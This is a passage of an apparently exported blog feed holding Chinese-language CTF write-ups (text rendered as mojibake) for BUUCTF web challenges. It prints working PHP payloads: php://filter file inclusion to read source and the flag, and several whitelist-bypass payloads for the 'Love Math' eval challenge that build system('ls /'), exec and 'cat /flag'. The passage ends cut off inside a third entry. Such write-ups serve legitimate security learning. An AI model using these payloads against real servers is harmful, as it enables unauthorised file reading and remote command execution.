    <content><![CDATA[<p>BUUCTF ç½‘å€ï¼šhttps://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">é¢˜ç›®ä¿¡æ¯</h1>
<p>è¿›å…¥ç¯å¢ƒä¹‹åï¼Œé¡µé¢æœ‰ä¸¤ä¸ªé€‰æ‹©</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329133629.png" /></p>
<p>è¿™æ—¶å€™é€‰å“ªä¸ªéƒ½ä¼šè·³å‡ºå¯¹åº”çš„å›¾ç‰‡ï¼ˆç‹—æˆ–è€…çŒ«ï¼‰ï¼Œå¹¶ä¸” url å‡ºç°å˜åŒ–</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://6bea1108-6e3e-4c6b-9295-bf25d2c8e728.node4.buuoj.cn:81/index.php?category=meowers</span><br></pre></td></tr></table></figure>
<p>æ­¤æ—¶æ‰“å¼€æºç å‘ç°ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329133835.png" /></p>
<p>æ¯åˆ·æ–°ä¸€æ¬¡è¿™ä¸ªçº¢æ¡†é‡Œçš„å›¾ç‰‡éƒ½ä¼šå˜åŒ–ï¼Œå› æ­¤ï¼Œå¯èƒ½å­˜åœ¨æ–‡ä»¶åŒ…å«ã€‚</p>
<h1 id="è§£é¢˜">è§£é¢˜</h1>
<p>å°è¯•çœ‹ä¸€ä¸‹æŠ¥é”™æœ‰æ²¡æœ‰ä¿¡æ¯ï¼Œå‘ç°è¾“å…¥ä»»ä½•ä¸œè¥¿éƒ½åªä¼šæç¤ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sorry, we currently only support woofers and meowers.</span><br></pre></td></tr></table></figure>
<p>å¯æ˜¯è¿™å¹¶ä¸ç®—æŠ¥é”™ï¼Œå› æ­¤ï¼Œå°è¯•ä¸€ä¸‹ <code>?category=meowers.php</code>ï¼Œæ­¤æ—¶å‘ç°æŠ¥é”™äº†ï¼</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329134329.png" /></p>
<p>æ­¤æ—¶ï¼Œå¯ä»¥ç¡®å®šæœ¬é¢˜æ˜¯æ–‡ä»¶åŒ…å«ï¼Œå‡½æ•°ä¸º <code>include()</code>ã€‚</p>
<p>åˆ©ç”¨ä¼ªåè®® <code>php://filter</code> å°è¯•è¯»å–ä¸€ä¸‹ <code>index.php</code> ï¼Œpayload å¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?category=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p>
<p>å‘ç°æŠ¥é”™äº†ï¼ŒæŠ¥é”™ä¿¡æ¯ä¸ºï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Warning: include(php://filter/read=convert.base64-encode/resource=index.php.php): failed to open stream: operation failed in /var/www/html/index.php on line 37</span><br></pre></td></tr></table></figure></p>
<p>æ³¨æ„æ–‡ä»¶ååæœ‰ä¸¤ä¸ªphpï¼ŒçŒœæµ‹åå°åœ¨æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°åé¢åŠ ä¸Šäº† <code>.php</code>ï¼Œå› æ­¤æ„é€ å¦‚ä¸‹payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?category=php://filter/read=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure></p>
<p>æˆåŠŸè¯»å–æºç ï¼Œbase64è§£ç åï¼Œå°†é‡è¦å†…å®¹æ•´ç†å¦‚ä¸‹ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">	<span class="keyword">if</span>( strpos( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">		<span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>é€šè¿‡ä»£ç å®¡è®¡çŸ¥é“ï¼š</p>
<ol type="1">
<li>éœ€è¦ä¼ å…¥å‚æ•° category</li>
<li>category éœ€è¦åŒ…å« <code>woofers</code>ï¼Œ <code>meowers</code>ï¼Œ <code>index</code> ä¸‰è€…ä¹‹ä¸€</li>
<li>æˆ‘ä»¬ä¼ å…¥çš„æ–‡ä»¶åä¸éœ€è¦åŒ…å« .php</li>
</ol>
<p>å‡è®¾æˆ‘ä»¬è¯»å–çš„æ˜¯ <code>flag</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¦å¸¦ä¸Šä¸Šè¿°çš„ç¬¬äºŒç‚¹çš„å…¶ä¸­ä¸€ä¸ªï¼Œè¿™å°±æ˜¯æœ¬é¢˜çš„éš¾ç‚¹ï¼Œæœ‰ä¸¤ç§payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ?category=php://filter/read=convert.base64-encode/resource=index/../flag</span><br><span class="line">2. ?category=php://filter/read=convert.base64-encode/index/resource=flag</span><br></pre></td></tr></table></figure></p>
<p>ä¸¤è€…éƒ½èƒ½å¾—åˆ°ç»“æœï¼ˆç¬¬äºŒä¸ªpayloadå°±æ˜¯ <code>php://filter</code> ä¼ªåè®®åµŒå¥—ï¼‰ï¼Œä½†æ˜¯å¦‚æœä½¿ç”¨ç¬¬äºŒç§ï¼Œä¼šå‡ºç°æŠ¥é”™ä¿¡æ¯ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329201529.png" /></p>
<p>è¿™é‡Œä¸æ˜¯å¾ˆæ‡‚ï¼Œä¸è¿‡æ ¹æ®ç»“æœå¯ä»¥çŒœæµ‹ï¼Œ<code>index</code> çš„ä½ç½®ä¸Šåº”è¯¥æ”¾çš„æ˜¯ filter è¿™ä¸ªä¼ªåè®®çš„é€‰é¡¹ï¼Œè€Œindexå¹¶ä¸æ˜¯ï¼Œæ‰€ä»¥è¿™é‡ŒæŠ¥é”™äº†ï¼Œä½†æ˜¯è¿™å¹¶ä¸å½±å“æ•´ä½“çš„æ‰§è¡Œã€‚</p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>é€šè¿‡æœ¬é¢˜å¯ä»¥å­¦åˆ°ï¼š <code>php://filter</code> ä¼ªåè®®çš„åµŒå¥—ã€‚</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHPä¼ªåè®®</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN 2019 åˆèµ› Love Math</title>
    <url>/2022/04/10/CISCN%202019%20%E5%88%9D%E8%B5%9B%20Love%20Math/</url>
    <content><![CDATA[<p>é¢˜ç›®åœ°å€ï¼š<a href="https://buuoj.cn/challenges#%5BCISCN%202019%20åˆèµ›%5DLove%20Math">Love Math</a></p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">é¢˜ç›®ä¿¡æ¯</h1>
<p>è¿›å…¥ç¯å¢ƒç›´æ¥å°±ç»™äº†æºç ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//ä¾‹å­ c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></p>
<h1 id="è§£é¢˜">è§£é¢˜</h1>
<p>éœ€è¦å…ˆçŸ¥é“å‡ ä¸ªPHPçš„ç‰¹æ€§ï¼š</p>
<ul>
<li>åŠ¨æ€å‡½æ•°ã€‚<code>$func='print_r';$func('hello');</code>ï¼Œè¿™å¥ä»£ç æ˜¯èƒ½å¤Ÿè¾“å‡ºhelloçš„ï¼Œé‚£æ˜¯å› ä¸º<code>$func</code>è¢«<code>print_r</code>ä»£æ›¿ï¼Œå› æ­¤èƒ½å¤ŸæˆåŠŸæ‰§è¡Œã€‚</li>
<li>å‡½æ•°åä¸ºå­—ç¬¦ä¸²ã€‚ä»ä¸Šé¢çš„ä¾‹å­ä¹Ÿå¯ä»¥çœ‹å‡ºå‡½æ•°åæ˜¯å­—ç¬¦ä¸²ã€‚</li>
</ul>
<p>å…ˆåˆ†æä¸€ä¸‹ä»£ç ï¼Œé¦–å…ˆè®¾ç½®äº†ä¸€ä¸ªé»‘åå•ï¼Œç„¶åå†è®¾ç½®äº†ä¸€ä¸ªç™½åå•ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°<code>c</code>ä¸èƒ½æœ‰é»‘åå•çš„å­—ç¬¦ï¼Œåˆå¿…é¡»åŒ…å«ç™½åå•çš„å­—ç¬¦ï¼Œè€Œä¸”é•¿åº¦ä¸èƒ½è¶…è¿‡80ã€‚è¿™æ ·å­æ‰èƒ½å¤Ÿæœ€ç»ˆæ‰§è¡Œåˆ°<code>eval('echo '.$content.';');</code>ã€‚</p>
<p>å› æ­¤ï¼Œæœ¬é¢˜è€ƒå¯Ÿçš„åº”è¯¥æ˜¯RCEã€‚æˆ‘ä»¬<strong>éœ€è¦å°†<code>$content</code>é€šè¿‡æŸç§æ–¹å¼å˜ä¸ºç±»ä¼¼<code>system('ls')</code>å‘½ä»¤</strong>ã€‚</p>
<h2 id="æ–¹æ³•1">æ–¹æ³•1</h2>
<p>å…ˆæ”¾å‡ºæœ€å¼€å§‹çš„payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=base_convert(1751504350,10,36)(base_convert(784,10,36))</span><br></pre></td></tr></table></figure></p>
<p>è§£é‡Šï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base_convert(1751504350,10,36) -&gt; system</span><br><span class="line">base_convert(784,10,36) -&gt; ls</span><br><span class="line">å› æ­¤ï¼Œç­‰ä»·äºsystem(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure></p>
<p>ä¹ŸæˆåŠŸè¢«æ‰§è¡Œï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410141715.png" /></p>
<p>ä½†æ˜¯ï¼Œå½“æ‰§è¡Œæœ‰ç‰¹æ®Šç¬¦å·çš„æ—¶å€™å°±ä¸è¡Œäº†ï¼Œæ¯”å¦‚<code>system('ls /')</code>ï¼Œå› ä¸ºç‰¹æ®Šç¬¦å·ä¸èƒ½ç›´æ¥ç”¨36è¿›åˆ¶è¡¨è¾¾ï¼Œå¦‚æœç›´æ¥è¾“å…¥åˆ™å› ä¸ºä¸åœ¨ç™½åå•è€Œæ— æ³•é€šè¿‡ã€‚å› æ­¤éœ€è¦åˆ©ç”¨<code>hex2bin</code>å°†16è¿›åˆ¶çš„è½¬ä¸ºå­—ç¬¦ï¼Œä½†æ˜¯16è¿›åˆ¶ä¹Ÿæ— æ³•è¿‡ç™½åå•ï¼ˆçº¯æ•°å­—å¯ä»¥è¿‡ï¼Œæˆ–è€…ç™½åå•å†…çš„å‡½æ•°åå¯ä»¥è¿‡ï¼‰ï¼Œå› æ­¤è¿˜éœ€è¦å°†16è¿›åˆ¶è½¬ä¸º10è¿›åˆ¶æ‰å¯ä»¥ã€‚å› æ­¤å°±ç”±äº†å¦‚ä¸‹payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=base_convert(1751504350,10,36)(base_convert(37907361743,10,36)(dechex(1819484207)))</span><br></pre></td></tr></table></figure></p>
<p>è§£é‡Šï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base_convert(1751504350,10,36) -&gt; system</span><br><span class="line">base_convert(37907361743,10,36) -&gt; hex2bin</span><br><span class="line">dechex(1819484207) -&gt; 6c73202f(ls /çš„16è¿›åˆ¶è¡¨ç¤º)</span><br><span class="line">å› æ­¤ï¼Œç­‰ä»·äºsystem(hex2bin(6c73202f)) -&gt; system(&#x27;ls /&#x27;)</span><br></pre></td></tr></table></figure></p>
<p>ä½†æ˜¯ï¼Œæ­¤æ—¶çš„é•¿åº¦å·²ç»è¶…è¿‡80äº†ã€‚</p>
<hr />
<center>
å°çŸ¥è¯†
</center>
<p>æ¥ä¸‹æ¥å°±å¾—æƒ³å¦‚ä½•å°†é•¿åº¦ç¼©å‡ï¼Œå¿½ç„¶å‘ç°å¯ä»¥åœ¨urlä¸­è¿™æ ·ä¼ å…¥æ•°æ®ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?p=$cmd=id;system($_GET[cmd])</span><br></pre></td></tr></table></figure></p>
<p>è¿™æ ·å­æœ€ç»ˆä¼ å…¥çš„<code>p</code>ä¸º<code>system(id)</code>ã€‚</p>
<hr />
<p>å› æ­¤å¯ä»¥åˆ©ç”¨è¿™ç§åŠæ³•åªåœ¨<code>c</code>å‚æ•°ä¼ å…¥å¿…è¦çš„ï¼Œå‰©ä¸‹çš„éƒ½é€šè¿‡ä¸Šè¿°æ–¹å¼æ”¾åˆ°<code>c</code>ä¸­ã€‚ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=system(&#x27;ls /&#x27;)</span><br><span class="line">-&gt; ?c=($$pi)&#123;min&#125;(($$pi)&#123;max&#125;)</span><br><span class="line"></span><br><span class="line">å…¶ä¸­$pi=base_convert(37907361743,10,36)(dechex(1598506324)) -&gt; _GET</span><br><span class="line">è¿™æ ·å­($$pi)&#123;min&#125;(($$pi)&#123;max&#125;) -&gt; $_GET&#123;min&#125;($_GET&#123;max&#125;)</span><br><span class="line">å…¶ä¸­ï¼Œ&#123;&#125;ç”¨äºä»£æ›¿[]ï¼Œå³$_GET[min]($_GET[max])</span><br></pre></td></tr></table></figure></p>
<p>ç„¶åå†ä¼ å…¥<code>min=system</code>å’Œ<code>max=ls /</code>å³å¯ã€‚æœ€ç»ˆpayloadå¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;max&#125;)&amp;pi=system&amp;max=ls /</span><br><span class="line"></span><br><span class="line">å¦‚æœä½¿ç”¨miné•¿åº¦å°±ä¼šè¶…ï¼Œå› æ­¤å…¶ä¸­ä¸€ä¸ªå˜é‡ä½¿ç”¨piï¼ˆè¿™é‡Œ$piå’Œpiæ˜¯ä¸ä¸€æ ·çš„ï¼Œå‰è€…æ˜¯å˜é‡ï¼Œåè€…å°±æ˜¯ä¸€ä¸ªå‚æ•°åï¼‰</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410144104.png" /></p>
<p>å°†<code>max=cat /flag</code>å¸¦å…¥å³å¯å¾—åˆ°flagã€‚</p>
<p>ä¹Ÿå¯ä»¥ç›´æ¥æ‰§è¡Œï¼Œä¸è¿‡è¦æ‰¾åˆ°æ¯”è¾ƒçŸ­çš„å‘½ä»¤ï¼ˆæ€è·¯ä¹Ÿæ˜¯ç±»ä¼¼çš„ï¼‰ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//exec(&#x27;hex2bin(dechex(109270211257898))&#x27;) =&gt; exec(&#x27;cat f*&#x27;)</span><br><span class="line">($pi=base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))</span><br><span class="line"></span><br><span class="line">//system(&#x27;cat&#x27;.dechex(16)^asinh^pi) =&gt; system(&#x27;cat *&#x27;)</span><br><span class="line">base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))</span><br></pre></td></tr></table></figure></p>
<h2 id="æ–¹æ³•2">æ–¹æ³•2</h2>
<p>åˆ©ç”¨ä¸€ä¸ªå‡½æ•°<code>getallheaders</code>ï¼Œç„¶åæŠŠå‘½ä»¤é€šè¿‡HTTPå¤´éƒ¨ä¼ å…¥ã€‚payloadå¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;cmd&#125;)</span><br></pre></td></tr></table></figure></p>
<p>è§£é‡Šï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$pi(696468,10,36) -&gt; exec</span><br><span class="line">$pi(8768397090111664438,10,30) -&gt; getallheaders</span><br><span class="line">å› æ­¤ï¼Œç­‰ä»·äºexec(getallheaders()&#123;2&#125;)ï¼Œå°±æ˜¯è·å–HTTPå¤´éƒ¨ä¿¡æ¯ä¸­ï¼Œå­—æ®µä¸º2çš„å†…å®¹ã€‚</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410144931.png" /></p>
<h2 id="æ–¹æ³•3">æ–¹æ³•3</h2>
<p>å‰ä¸¤ç§æ–¹æ³•éƒ½æ˜¯åˆ©ç”¨å°†è¦ä¼ å…¥çš„å‘½ä»¤è½¬ä¸ºæ•°å­—ï¼Œç„¶åé€šè¿‡å‡½æ•°å†è½¬æ¢å›å¯¹åº”çš„å‡½æ•°åï¼Œä»è€Œæ‰§è¡Œå‘½ä»¤ã€‚ä½†æ˜¯å…¶å®ç™½åå•é‡Œé¢æœ‰è®¸å¤šçš„å¯ç”¨å­—ç¬¦ï¼Œç”¨è¿™äº›å­—ç¬¦ä»£æ›¿ä¹‹å‰çš„æ•°å­—ï¼Œè¿›è¡ŒæŸç§è¿ç®—å¾—åˆ°æƒ³è¦çš„å‡½æ•°åã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$k</span>=<span class="number">1</span>;<span class="variable">$k</span>&lt;=sizeof(<span class="variable">$payload</span>);<span class="variable">$k</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">9</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span> &lt;=<span class="number">9</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="variable">$exp</span> = <span class="variable">$payload</span>[<span class="variable">$k</span>] ^ <span class="variable">$i</span>.<span class="variable">$j</span>;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="variable">$payload</span>[<span class="variable">$k</span>].<span class="string">&quot;^<span class="subst">$i</span><span class="subst">$j</span>&quot;</span>.<span class="string">&quot;==&gt;<span class="subst">$exp</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410150225.png" /></p>
<p>ä¼šå‘ç° <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">is_nan^64==&gt;_G</span><br><span class="line">tan^15==&gt;ET</span><br></pre></td></tr></table></figure></p>
<p>å› æ­¤ï¼Œæœ€ç»ˆçš„payloadä¸ºï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0=system&amp;1=cat%20/flag</span><br></pre></td></tr></table></figure></p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>è¿™é¢˜è€ƒå¯Ÿçš„éƒ½æ˜¯å…³äºPHPçš„çŸ¥è¯†ï¼ˆæˆ‘è¿™ä¸ä¼šPHPçš„å¤ªéš¾äº†ï¼‰</p>
<ul>
<li>å„ç§ç¼–ç è½¬æ¢ç»•è¿‡</li>
<li>URLä¸­ä½¿ç”¨<code>$_GET</code>è·å–æ•°æ®</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHPçŸ¥è¯†</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF 2018 Online Tool</title>
    <url>/2022/03/22/BUUCTF%202018%20Online%20Tool/</url>
    <content><![CDATA[<p>BUUCTF ç½‘å€ï¼šhttps://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">é¢˜ç›®ä¿¡æ¯</h1>
<p>è¿›å…¥ç¯å¢ƒï¼Œå¾—åˆ°å¦‚ä¸‹ä»£ç ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>Â (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]))Â &#123; </span><br><span class="line">	<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]Â = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>]))Â &#123; </span><br><span class="line">	highlight_file(<span 